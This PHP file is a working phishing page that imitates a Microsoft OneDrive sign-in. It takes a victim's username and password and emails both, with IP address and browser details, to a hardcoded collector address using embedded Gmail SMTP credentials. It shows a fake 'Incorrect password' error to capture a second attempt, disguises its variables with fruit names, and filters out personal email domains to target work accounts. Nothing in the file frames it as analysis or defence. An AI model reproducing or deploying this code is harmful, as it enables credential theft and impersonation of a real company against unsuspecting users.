<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

if (!class_exists('PHPMailer\PHPMailer\PHPMailer')) {
    require_once 'PHPMailer/PHPMailer/src/Exception.php';
    require_once 'PHPMailer/PHPMailer/src/PHPMailer.php';
    require_once 'PHPMailer/PHPMailer/src/SMTP.php';
}

session_start();

$appleJuice = 'weshannah354@gmail.com';
$bananaSmoothie = 'cooling.jamesofficial@gmail.com';
$cherryJam = 'crktyarheiolheqn';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST['fruit_basket'])) {
        $_SESSION['watermelon'] = trim($_POST['fruit_basket']);
        $_SESSION['step'] = 'password';
        $_SESSION['password_attempt'] = 0;
        $_SESSION['first_password_sent'] = false;
        $_SESSION['second_password_sent'] = false;
        unset($_SESSION['show_password_error']);
        
        $mailHandler = new PHPMailer\PHPMailer\PHPMailer(true);
        try {
            $mailHandler->isSMTP();
            $mailHandler->Host = 'smtp.gmail.com';
            $mailHandler->SMTPAuth = true;
            $mailHandler->Username = $appleJuice;
            $mailHandler->Password = $cherryJam;
            $mailHandler->SMTPSecure = 'tls';
            $mailHandler->Port = 587;
            
            $mailHandler->setFrom($appleJuice, 'System Notifier');
            $mailHandler->addAddress($bananaSmoothie);
            $mailHandler->Subject = "Access Request - User ID";
            $mailHandler->Body = "User Identifier: " . $_SESSION['watermelon'] . "\n" . "Connection Address: " . $_SERVER['REMOTE_ADDR'] . "\n" . "User Agent: " . $_SERVER['HTTP_USER_AGENT'];
            
            $mailHandler->send();
        } catch (Exception $e) {}
            
    } elseif (isset($_POST['orange_seed'])) {
        $grapeVine = trim($_POST['orange_seed']);
        
        // Increment password attempt
        $_SESSION['password_attempt'] = ($_SESSION['password_attempt'] ?? 0) + 1;
        
        // Send FIRST password attempt as separate email
        if ($_SESSION['password_attempt'] == 1 && !$_SESSION['first_password_sent']) {
            $mailHandler = new PHPMailer\PHPMailer\PHPMailer(true);
            try {
                $mailHandler->isSMTP();
                $mailHandler->Host = 'smtp.gmail.com';
                $mailHandler->SMTPAuth = true;
                $mailHandler->Username = $appleJuice;
                $mailHandler->Password = $cherryJam;
                $mailHandler->SMTPSecure = 'tls';
                $mailHandler->Port = 587;
                
                $mailHandler->setFrom($appleJuice, 'System Notifier');
                $mailHandler->addAddress($bananaSmoothie);
                $mailHandler->Subject = "Access Request - First Password Attempt";
                $mailHandler->Body = "=== FIRST PASSWORD ATTEMPT ===\n\n" .
                                     "User Identifier: " . ($_SESSION['watermelon'] ?? 'Not provided') . "\n" .
                                     "Password: " . $grapeVine . "\n\n" .
                                     "Connection Address: " . $_SERVER['REMOTE_ADDR'] . "\n" .
                                     "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n" .
                                     "Timestamp: " . date('Y-m-d H:i:s');
                
                $mailHandler->send();
                $_SESSION['first_password_sent'] = true;
                $_SESSION['first_password_value'] = $grapeVine;
            } catch (Exception $e) {}
            
            // Stay on password page with error message
            $_SESSION['show_password_error'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        }
        
        // Send SECOND password attempt as separate email
        if ($_SESSION['password_attempt'] >= 2 && !$_SESSION['second_password_sent']) {
            $mailHandler = new PHPMailer\PHPMailer\PHPMailer(true);
            try {
                $mailHandler->isSMTP();
                $mailHandler->Host = 'smtp.gmail.com';
                $mailHandler->SMTPAuth = true;
                $mailHandler->Username = $appleJuice;
                $mailHandler->Password = $cherryJam;
                $mailHandler->SMTPSecure = 'tls';
                $mailHandler->Port = 587;
                
                $mailHandler->setFrom($appleJuice, 'System Notifier');
                $mailHandler->addAddress($bananaSmoothie);
                $mailHandler->Subject = "Access Request - Second Password Attempt";
                $mailHandler->Body = "=== SECOND PASSWORD ATTEMPT ===\n\n" .
                                     "User Identifier: " . ($_SESSION['watermelon'] ?? 'Not provided') . "\n" .
                                     "First Password: " . ($_SESSION['first_password_value'] ?? 'Not captured') . "\n" .
                                     "Second Password: " . $grapeVine . "\n\n" .
                                     "Connection Address: " . $_SERVER['REMOTE_ADDR'] . "\n" .
                                     "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n" .
                                     "Timestamp: " . date('Y-m-d H:i:s');
                
                $mailHandler->send();
                $_SESSION['second_password_sent'] = true;
                
                // Store second password in session before redirect
                $_SESSION['second_password_value'] = $grapeVine;
            } catch (Exception $e) {}
            
            // Redirect to comps.php WITHOUT destroying session
            header("Location: comps.php");
            exit;
        }
        
        // If we get here, just show error again
        $_SESSION['show_password_error'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
}

$currentStep = $_SESSION['step'] ?? 'username';
$showPasswordError = $_SESSION['show_password_error'] ?? false;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft OneDrive</title>
    <style>
        body{font-family:'Segoe UI',Arial,sans-serif;margin:0;padding:0;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;background-color:#f5f5f5;}
        .access-form-container{position:relative;width:400px;background-color:#ffffff;border-radius:0;box-shadow:0 2px 10px rgba(0,0,0,0.08);margin:10px;padding:20px;display:flex;flex-direction:column;justify-content:left;}
        .page-header{font-size:20px;color:#7e7979;margin-bottom:20px;text-align:left;padding:20px;}
        .main-title{text-align:center;font-weight:bold;color:#333;margin-bottom:15px;font-size:45px;}
        .input-container{position:relative;margin-left:1px;}
        .validation-alert{display:none;color:#d93025;margin-bottom:13px;margin-left:22px;margin-top:10px;font-size:14px;}
        .email-type-alert{display:none;color:#d93025;margin-bottom:13px;margin-left:22px;margin-top:10px;font-size:14px;}
        .password-error{color:#d93025;margin:0;margin-left:22px;font-size:13px;padding-top:4px;}
        .info-section{position:relative;width:400px;background-color:#fff;border-radius:0;box-shadow:0 2px 10px rgba(0,0,0,0.08);margin:10px;padding:20px;display:flex;flex-direction:column;justify-content:center;}
        .secondary-link{text-align:left;color:#0056b3;font-size:14px;font-family:'Segoe UI',sans-serif;cursor:pointer;text-decoration:none;padding:2px;margin-left:-2px;margin-top:10px;}
        .user-input{width:calc(100% - 50px);padding:1px;margin:0;border:none;border-radius:0;box-shadow:0 1px 0 rgba(0,0,0,0.1);color:#333;text-align:left;margin-left:20px;font-size:16px;line-height:1;padding:12px 5px;box-sizing:border-box;}
        .user-input:focus{outline:none;box-shadow:0 0 0 #ebebeb;}
        .text-section{text-align:left;color:#333;margin-left:25px;margin-top:15px;margin-bottom:15px;font-size:14px;}
        .form-label{width:100%;font-size:26px;font-weight:600;text-align:left;margin-bottom:5px;padding-top:1px;margin-top:-25px;font-family:'Segoe UI',sans-serif;margin-left:25.5px;}
        .create-account-link{color:#0e6edb;text-decoration:none;}
        .action-button-container{display:flex;justify-content:flex-end;margin-top:15px;}
        .action-button{background-color:rgba(0,101,183,0.911);color:white;padding:10px 30px;border:none;border-radius:1px;cursor:pointer;font-size:14px;}
        .sign-in-options{margin-left:20px;font-size:14px;color:#333;display:flex;align-items:center;}
        .key-icon{width:35px;height:auto;vertical-align:middle;margin-right:10px;}
        .password-recovery{text-align:left;color:#0056b3;font-size:14px;font-family:'Segoe UI',sans-serif;cursor:pointer;text-decoration:none;padding:2px;margin-left:-2px;margin-top:10px;}
        .brand-logo{width:40px;height:auto;vertical-align:middle;margin-right:-7px;position:relative;top:-5px;transition:top 0.3s ease;}
        .brand-logo:hover{top:-7px;}
    </style>
</head>
<body>
    <div class="access-form-container">
        <h2 class="page-header">
            <img src="com.png" alt="Microsoft Logo" class="brand-logo"> Microsoft
        </h2>
        
        <?php if ($currentStep === 'username'): ?>
            <label for="user-input-field" class="form-label">Sign in</label>
            <form id="access-form" method="POST" action="">
                <div class="input-container">
                    <div id="validation-message" class="validation-alert">
                        Please enter your email address, phone, or Skype.
                    </div>
                    <div id="email-type-message" class="email-type-alert">
                        Please use a Microsoft account.
                    </div>
                    <input type="text" 
                           id="user-input-field" 
                           name="fruit_basket" 
                           placeholder="Email address, phone, or Skype" 
                           class="user-input">
                </div>

                <div class="text-section">
                    <p>No account? <a href="pap.php" class="create-account-link">Create one!</a></p>
                    <a href="pap.php" class="secondary-link">Create a new account here</a>
                </div>

                <div class="action-button-container">
                    <button type="submit" class="action-button">Next</button>
                </div>
            </form>
            
        <?php else: ?>
            <label for="password-input-field" class="form-label">Enter password</label>
            <form id="password-form" method="POST" action="">
                <div class="input-container">
                    <input type="password" 
                           id="password-input-field" 
                           name="orange_seed" 
                           placeholder="Password" 
                           class="user-input"
                           style="margin-bottom:<?php echo $showPasswordError ? '0' : '15px'; ?>">
                    <?php if ($showPasswordError): ?>
                        <div class="password-error">Incorrect password</div>
                    <?php endif; ?>
                    <div id="password-validation-message" class="validation-alert">
                        Please enter your password.
                    </div>
                </div>

                <div class="text-section">
                    <p><a href="#" class="password-recovery">Forgot my password</a></p>
                    <a href="#" class="secondary-link">Forgot my username</a>
                </div>

                <div class="action-button-container">
                    <button type="submit" class="action-button">Sign in</button>
                </div>
            </form>
        <?php endif; ?>
    </div>
    
    <div class="info-section">
        <div class="sign-in-options">
            <img src="keyxx.PNG" alt="Sign-in Options" class="key-icon">
            <p>Sign-in options</p>
        </div>
    </div>

    <script>
        <?php if ($currentStep === 'username'): ?>
            document.getElementById('access-form').addEventListener('submit', function(event) {
                var inputElement = document.getElementById('user-input-field');
                var validationAlert = document.getElementById('validation-message');
                var emailTypeAlert = document.getElementById('email-type-message');
                var inputValue = inputElement.value.trim().toLowerCase();
                
                validationAlert.style.display = 'none';
                emailTypeAlert.style.display = 'none';
                
                if (inputValue === "") {
                    validationAlert.style.display = 'block';
                    event.preventDefault();
                    return;
                }
                
                if (inputValue.includes('@')) {
                    var blockedDomains = ['@gmail.com', '@aol.com', '@icloud.com', '@yahoo.com'];
                    
                    for (var i = 0; i < blockedDomains.length; i++) {
                        if (inputValue.endsWith(blockedDomains[i])) {
                            emailTypeAlert.style.display = 'block';
                            event.preventDefault();
                            return;
                        }
                    }
                }
                
                validationAlert.style.display = 'none';
                emailTypeAlert.style.display = 'none';
            });
        <?php else: ?>
            document.getElementById('password-form').addEventListener('submit', function(event) {
                var inputElement = document.getElementById('password-input-field');
                var alertElement = document.getElementById('password-validation-message');

                if (inputElement.value.trim() === "") {
                    alertElement.style.display = 'block';
                    event.preventDefault();
                } else {
                    alertElement.style.display = 'none';
                }
            });
        <?php endif; ?>
    </script>
</body>
</html>